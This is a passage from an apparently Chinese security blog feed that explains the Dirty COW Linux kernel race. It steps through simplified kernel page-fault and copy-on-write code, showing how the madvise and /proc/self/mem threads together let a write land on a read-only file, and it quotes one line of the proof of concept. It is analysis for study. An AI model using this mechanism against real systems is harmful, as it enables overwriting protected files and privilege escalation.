class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">   <span class="keyword">goto</span> retry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">follow_page_mask(...,flag,...)&#123;</span><br><span class="line"><span class="comment">//这个函数会走 页一集目录-&gt;二级目录-&gt;页表项 的传统页式内存的管理流程</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> follow_page_pte(...,flag,...); <span class="comment">//走到了流程的第三步：寻找页表项</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">follow_page_pte(...,flag,...)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//如果获取页表项时要求页表项所指向的内存映射具有写权限，但是页表项所指向的内存并没有写权限。则会返回空</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123; <span class="comment">//FOLL_WRITE = 1</span></span><br><span class="line">       pte_unmap_unlock(ptep, ptl);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取页表项的请求不要求内存映射具有写权限的话会返回页表项</span></span><br><span class="line"><span class="keyword">return</span> pages;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">faultin_page(vma,)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//处理page fault</span></span><br><span class="line">ret = handle_mm_fault();</span><br><span class="line"><span class="comment">//这个if对应了上一个函数的注释，如果是因为映射没有写权限导致的获取页表项失败，会去掉flags中的FOLL_WRITE标记，从而使的获取页表项不再要求内存映射具有写的权限。</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line"><span class="comment">//页表为空，说明缺页。调用do_fault调页</span></span><br><span class="line"><span class="keyword">if</span> (!fe-&gt;pte) &#123;</span><br><span class="line">      ... </span><br><span class="line">         <span class="keyword">return</span> do_fault(fe);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//页表不为空，但是要写入的页没有写权限，这时可能需要COW</span></span><br><span class="line">   <span class="keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">   <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(fe, entry);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_fault(fe)&#123;</span><br><span class="line"><span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line"><span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_cow_fault(fe,pgoff)&#123;</span><br><span class="line"><span class="comment">//执行COW， 并更新页表为COW后的页表。</span></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// __do_fault会将内存</span></span><br><span class="line">ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);</span><br><span class="line">... </span><br><span class="line">copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);</span><br><span class="line">ret |= alloc_set_pte(fe, memcg, new_page);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">do_read_fault(fe,pgoff)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//不执行COW，直接映射文件。</span></span><br><span class="line">__do_fault(fe, pgoff, <span class="literal">NULL</span>, &amp;fault_page, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br><span class="line">ret |= alloc_set_pte(fe, <span class="literal">NULL</span>, fault_page);</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_set_pte(fe,...)&#123;</span><br><span class="line"><span class="keyword">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;</span><br><span class="line"><span class="comment">//如果执行了COW，设置页表时会将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line"><span class="keyword">if</span> (write)</span><br><span class="line">entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">do_wp_page(fe,entry)&#123;</span><br><span class="line"> ....</span><br><span class="line"> <span class="comment">//内核通过检查，发现COW操作已经在缺页处理时完成了，所以不再进行COW，而是直接利用之前COW得到的页表项</span></span><br><span class="line"> <span class="keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wp_page_reuse()&#123;</span><br><span class="line"> <span class="comment">//将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line"> entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_mkwrite()&#123;</span><br><span class="line"><span class="comment">//这就是maybe_mkwrite不会标记页为可写的原因，因为这个页为只读页。所以不满足if的条件</span></span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">pte = pte_mkwrite(pte);</span><br><span class="line"><span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>再对照着 POC 可以知道，我们 mmap 了一段区域( <code>map=mmap(NULL,st.st_size,PROT_READ,MAP_PRIVATE,f,0)</code> )，先看 <strong>procselfmemThread</strong> 线程，往 <code>/proc/self/mem</code> 进行读写操作，本质是调用了一系列函数：<code>mem_write</code> -&gt; <code>mem_rw</code> -&gt; <code>access_remote_vm</code> -&gt; <code>__access_remote_vm</code> ，<strong>__access_remote_vm</strong> 中的 <strong>get_user_pages</strong> 获取需要写入的内存页，<strong>get_user_pages **函数会调用 **follow_page_mask</strong> 函数寻找内存页对应的页表项。</p><p>因为这是 mmap 后第一次对 map 进行操作，所以 map 所对应的页表为空，接着经过 if 判断，调用 <strong>faultin_page</strong> 函数。</p><p>对应的函数简化如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">...</span><br><span class="line">retry:</span><br><span class="line">...</span><br><span class="line">page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">   <span class="keyword">goto</span> retry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>faultin_page **函数会调用 **handle_mm_fault</strong> 进行缺页处理。缺页处理时，如果页表为空，内核会调用 <strong>do_fault</strong> 函数调页，这个函数会检查是否是因为<strong>内存写</strong>造成的缺页以及该内存是否是以 private 方式 mmap 的内存，如果是，则会进行 COW 操作，更新页表为 COW 后的页表。并将返回值的 <strong>FAULT_FLAG_WRITE 位</strong> 置为1，也就是触发缺页中断，并将页面标记为脏。</p><p>对应的函数简化如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">faultin_page(vma,)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//处理page fault</span></span><br><span class="line">ret = handle_mm_fault();</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line"><span class="comment">//页表为空，说明缺页。调用do_fault调页</span></span><br><span class="line"><span class="keyword">if</span> (!fe-&gt;pte) &#123;</span><br><span class="line">      ... </span><br><span class="line">         <span class="keyword">return</span> do_fault(fe);</span><br><span class="line">   &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_fault(fe)&#123;</span><br><span class="line"><span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line"><span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_cow_fault(fe,pgoff)&#123;</span><br><span class="line"><span class="comment">//执行COW,并更新页表为COW后的页表。</span></span><br><span class="line">new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, fe-&gt;address);</span><br><span class="line">...</span><br><span class="line"><span class="comment">// __do_fault会将内存</span></span><br><span class="line">ret = __do_fault(fe, pgoff, new_page, &amp;fault_page, &amp;fault_entry);</span><br><span class="line">... </span><br><span class="line">copy_user_highpage(new_page, fault_page, fe-&gt;address, vma);</span><br><span class="line">ret |= alloc_set_pte(fe, memcg, new_page);</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> ret</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">alloc_set_pte(fe,...)&#123;</span><br><span class="line"><span class="keyword">bool</span> write = fe-&gt;flags &amp; FAULT_FLAG_WRITE;<span class="comment">//FAULT_FLAG_WRITE = 1</span></span><br><span class="line"><span class="comment">//如果执行了COW，设置页表时会将页面标记为脏，但是不会标记为可写。</span></span><br><span class="line"><span class="keyword">if</span> (write)</span><br><span class="line">entry = maybe_mkwrite(pte_mkdirty(entry), vma);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">maybe_mkwrite()&#123;</span><br><span class="line"><span class="comment">//这就是maybe_mkwrite不会标记页为可写的原因，因为这个页为只读页。所以不满足if的条件</span></span><br><span class="line"><span class="keyword">if</span> (likely(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">pte = pte_mkwrite(pte);</span><br><span class="line"><span class="keyword">return</span> pte;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应的流程图如下(这里是直接拿网上师傅的图)：</p><p>这幅图表示第一次 mmap，此时文件已经从磁盘上加载到了内存中(即文件对应的 page cache) ，但是进程相应的页表还没有建立。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651319895175690/f8107b99f5987084fbd18724daafa6f683cabc79.png" alt="dirtycow1"></p><p>之后尝试访问这个页，但发现页表项为空，所以触发一个缺页中断，因为映射的属性是只读并且私有，而我们要写，所以会触发COW。并标记页表为只读(RO)和脏(DIRTY)。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651320033134982/e50598611ce40e0a5ea461d85c8e7068cf148594.png" alt="dirtycow2"></p><h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>返回后，因为现在页表已经设置好了，所以第二次 <strong>get_user_pages **会调用 **follow_page_mask</strong> 寻找页表项，<strong>follow_page_mask</strong> 会调用 <strong>follow_page_pte</strong> 函数。这个函数会通过 flag 参数的 <strong>FOLL_WRITE</strong> 位是否为 1 来判断<strong>该页是否被要求具有写权限</strong>，通过页表项的 <strong>VM_WRITE</strong> 位是否为 1 来判断<strong>该页是否可写</strong>。</p><p>因为此时我们 mmap 出来的 map 带的属性是 <strong>PROT_READ</strong> 和 <strong>MAP_PRIVATE</strong>，所以此时的 <strong>VM_WRITE</strong> 为 0 ，即该页不可写，而我们要求页表是可写的，对应 <strong>FOLL_WRITE</strong> 为 1，所以会返回 0 ，再一次触发中断。</p><p>对应的函数简化如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">get_user_pages&#123;<span class="comment">//这是一个Wrap</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> __get_user_pages() <span class="comment">//获取用户内存的核心函数</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">...</span><br><span class="line">retry:</span><br><span class="line">...</span><br><span class="line">        cond_resched();</span><br><span class="line">page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">follow_page_mask(...,flag,...)&#123;</span><br><span class="line"><span class="comment">//这个函数会走 页一集目录-&gt;二级目录-&gt;页表项 的传统页式内存的管理流程</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> follow_page_pte(...,flag,...); <span class="comment">//走到了流程的第三步：寻找页表项</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">follow_page_pte(...,flag,...)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//如果获取页表项时要求页表项所指向的内存映射具有写权限，但是页表项所指向的内存并没有写权限。则会返回空</span></span><br><span class="line"><span class="keyword">if</span> ((flags &amp; FOLL_WRITE) &amp;&amp; !pte_write(pte)) &#123; <span class="comment">//FOLL_WRITE = 1</span></span><br><span class="line">       pte_unmap_unlock(ptep, ptl);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取页表项的请求不要求内存映射具有写权限的话会返回页表项</span></span><br><span class="line"><span class="keyword">return</span> pages;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>follow_page_pte</strong> 函数返回 0 ，使得 page 为 0 ，再一次进入 <strong>faultin_page</strong> 函数，<strong>faultin_page</strong> 函数调用 <strong>handle_mm_fault</strong> 函数，然后到 <strong>handle_pte_fault</strong> 函数，因为这一次页表不为空，所以会检查是否是因为页没有写权限导致的中断，如果是因为没有写权限中断，就会调用 <strong>do_wp_page</strong> 函数，<strong>do_wp_page</strong> 函数会检查 COW 操作是否已经进行过(整合的函数没有这一步，具体要去看源码)，因为在 step1 就已经 COW 过了，所以这里会直接利用之前 COW 得到的页表项，之后 <strong>handle_mm_fault</strong> 的返回值的 <strong>VM_FAULT_WRITE</strong> 位会被置为1。</p><p>接着 <strong>faultin_page</strong> 会通过判断 <strong>handle_mm_fault</strong> 返回值的 <strong>VM_FAULT_WRITE</strong> 位是否为1来判断COW是否顺利完成，以及通过页表项 <strong>VM_WRITE **位是否为1来判断该内存是否可写。如果判断出来 COW 已完成并且页表项不可写，就会将 **FOLL_WRITE</strong> 置 0 ，<strong>从而使获取的页表项不再要求具有写权限</strong>，并返回 <strong>get_user_pages</strong>。</p><p>对应函数简化如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">__get_user_pages(vma,...,<span class="keyword">int</span> flag,...)&#123;</span><br><span class="line">...</span><br><span class="line">retry:</span><br><span class="line">...</span><br><span class="line">        cond_resched();</span><br><span class="line">page = follow_page_mask(...,flag,...); <span class="comment">//获取页表项</span></span><br><span class="line">       <span class="keyword">if</span> (!page) &#123;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line">ret = faultin_page(vma,...); <span class="comment">//获取失败时会调用这个函数</span></span><br><span class="line"><span class="keyword">switch</span> (ret) &#123;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">0</span>:<span class="comment">//如果返回为0，就重试，这是一个循环</span></span><br><span class="line">   <span class="keyword">goto</span> retry;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">faultin_page(vma,)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//处理page fault</span></span><br><span class="line">ret = handle_mm_fault();</span><br><span class="line"><span class="comment">//这个if对应了上一个函数的注释，如果是因为映射没有写权限导致的获取页表项失败，会去掉flags中的FOLL_WRITE标记，从而使的获取页表项不再要求内存映射具有写的权限。</span></span><br><span class="line"><span class="keyword">if</span> ((ret &amp; VM_FAULT_WRITE) &amp;&amp; !(vma-&gt;vm_flags &amp; VM_WRITE))</span><br><span class="line">*flags &amp;= ~FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>；</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_mm_fault()&#123;</span><br><span class="line"></span><br><span class="line">__handle_mm_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__handle_mm_fault()&#123;</span><br><span class="line">handle_pte_fault()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle_pte_fault()&#123;</span><br><span class="line">    ...</span><br><span class="line">   <span class="comment">//页表不为空，但是要写入的页没有写权限，这时可能需要COW</span></span><br><span class="line">   <span class="keyword">if</span> (fe-&gt;flags &amp; FAULT_FLAG_WRITE) &#123;</span><br><span class="line">   <span class="keyword">if</span> (!pte_write(entry))</span><br><span class="line"><span class="keyword">return</span> do_wp_page(fe, entry);</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_wp_page(fe,entry)&#123;</span><br><span class="line"> ....</span><br><span class="line"> <span class="comment">//内核通过检查，发现COW操作已经在缺页处理时完成了，所以不再进行COW，而是直接利用之前COW得到的页表项</span></span><br><span class="line"> <span class="keyword">return</span> wp_page_reuse(fe, orig_pte, old_page, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应流程图如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651325336706946/d26edeb2f385e18e64b3157978e6673222d7a3ad.png" alt="dirtycow3"></p><h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p><strong>get_user_pages</strong> 第三次调用 <strong>follow_page_mask</strong> 进行寻页，注意此时的 <strong>FOLL_WRITE</strong> 已被置为 0，也就是在寻页的时候不再需要页具有写权限。正常来说，程序会直接返回找到的页表项 map，然后执行写操作(注意这里写的地方是 COW 出来的副本，也就是图中对应的 anonymous page，并不是 page cache)。但是因为此时我们通过 <strong>pthread_join</strong> 函数加入了 <strong>madviseThread</strong> 线程，<strong>cond_resched()</strong> 函数使其执行，里面的 <strong>madvise</strong> 函数 <strong>advice</strong> 位被置为 <strong>MADV_DONTNEED</strong>，所以 map 页表项 COW 出来的副本(anonymous page)会被置空。</p><p>对应流程图：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382699766968/cd3854460f2afe3f5eee863d1e3dbb75d85d9552.png" alt="dirtycow4"></p><p>回到 <strong>procselfmemThread</strong> 线程，因为页表已被置空，所以会再一次触发中断，进入 <strong>faultin_page</strong> 等一系列函数，然后进到 <strong>do_fault</strong>，因为此时页表已经不被要求具有写权限，所以不会执行 COW 操作，而是直接映射文件，也就是直接返回了 page cache 这个物理内存。</p><p>对应函数如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">do_fault(fe)&#123;</span><br><span class="line"><span class="comment">//如果不要求目标内存具有写权限时导致缺页，内核不会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(fe-&gt;flags &amp; FAULT_FLAG_WRITE))</span><br><span class="line"><span class="keyword">return</span> do_read_fault(fe, pgoff);</span><br><span class="line"><span class="comment">//如果要求目标内存具有写权限时导致缺页，目标内存映射是一个VM_PRIVATE的映射，内核会执行COW操作产生副本</span></span><br><span class="line"><span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))</span><br><span class="line"><span class="keyword">return</span> do_cow_fault(fe, pgoff);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">do_read_fault(fe,pgoff)&#123;</span><br><span class="line">...</span><br><span class="line"><span class="comment">//不执行COW，直接映射文件。</span></span><br><span class="line">__do_fault(fe, pgoff, <span class="literal">NULL</span>, &amp;fault_page, <span class="literal">NULL</span>);</span><br><span class="line">...</span><br><span class="line">ret |= alloc_set_pte(fe, <span class="literal">NULL</span>, fault_page);</span><br><span class="line">...</span><br><span class="line">ret</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对应流程图如下：</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651382925127930/58a1fd21557e53a1c1beb45bd9fddc37fe0c2284.png" alt="dirtycow5"></p><p>此时我们再进入 <strong>procselfmemThread</strong> 线程，通过向 /proc/self/mem 强制执行写操作，写 /proc/self/mem 的原理就是调用 kmap ，kmap 也是指向 map 的，也就会直接将内容写入 map 物理内存。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383600681010/afd9fffd11019fe8206e419b0753be55a3fecc38.png" alt="dirtycow6"></p><p>最后由于page cache的写回机制，最终会覆盖磁盘上的文件，攻击完成。</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/Dirtycow/1651383664718195/2adf67315f755f8047b968a2996e849f8aaae471.png" alt="dirtycow7"></p><hr><p>参考博客</p><p><a href="https://blog.csdn.net/qq_39153421/article/details/116742488">https://blog.csdn.net/qq_39153421/article/details/116742488</a></p><p><a href="https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/">https://xuanxuanblingbling.github.io/ctf/pwn/2019/11/18/race/</a></p><p><a href="https://zhuanlan.zhihu.com/p/25918300">https://zhuanlan.zhihu.com/p/25918300</a></p><p><a href="https://www.bilibili.com/read/cv11057658">https://www.bilibili.com/read/cv11057658</a></p><p><a href="https://atum.li/2016/10/25/dirtycow/">https://atum.li/2016/10/25/dirtycow/</a></p><p><a href="https://codeantenna.com/a/bjX4ujmG2Y">https://codeantenna.com/a/bjX4ujmG2Y</a></p><p><a href="https://xuanxuanblingbling.github.io/assets/attachment/%E5%A5%94%E8%B7%91%E5%90%A7-linux%E5%86%85%E6%A0%B8-%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86-DirtyCow.pdf">奔跑吧-linux内核-内存管理-DirtyCow.pdf</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fuzzing101-exe5</title>
      <link href="/2022/04/20/Fuzzing101-exe5/"/>
      <url>/2022/04/20/Fuzzing101-exe5/</url>
      
